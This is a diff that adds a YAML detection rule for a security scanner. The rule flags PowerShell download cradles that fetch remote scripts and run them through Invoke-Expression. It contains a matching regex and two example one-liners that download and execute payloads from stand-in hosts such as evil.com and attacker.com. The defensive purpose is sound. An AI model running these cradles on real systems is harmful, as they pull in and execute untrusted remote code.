@@ -1,0 +1,29 @@
+# Example of a GOOD Script Sentinel Pattern
+# This pattern detects PowerShell download cradles
+
+id: PS-001
+name: Invoke-Expression Download Cradle
+description: |
+  Detects PowerShell download and execute pattern using IEX.
+  This is a common malware delivery technique where scripts are
+  downloaded from remote servers and immediately executed via
+  Invoke-Expression or its aliases.
+languages:
+  - powershell
+detection_type: regex
+detection_logic: '(?i)(invoke-expression|iex)\s*\(\s*(new-object|iwr|wget|curl)'
+severity: High
+mitre_technique: T1059.001
+confidence: 0.85
+category: execution
+enabled: true
+metadata:
+  author: "Script Sentinel Team"
+  created: "2025-01-15"
+  tags:
+    - download-cradle
+    - code-execution
+    - malware-delivery
+  examples:
+    - "IEX (New-Object Net.WebClient).DownloadString('http://evil.com')"
+    - "Invoke-Expression (iwr 'http://attacker.com/payload.ps1').Content"
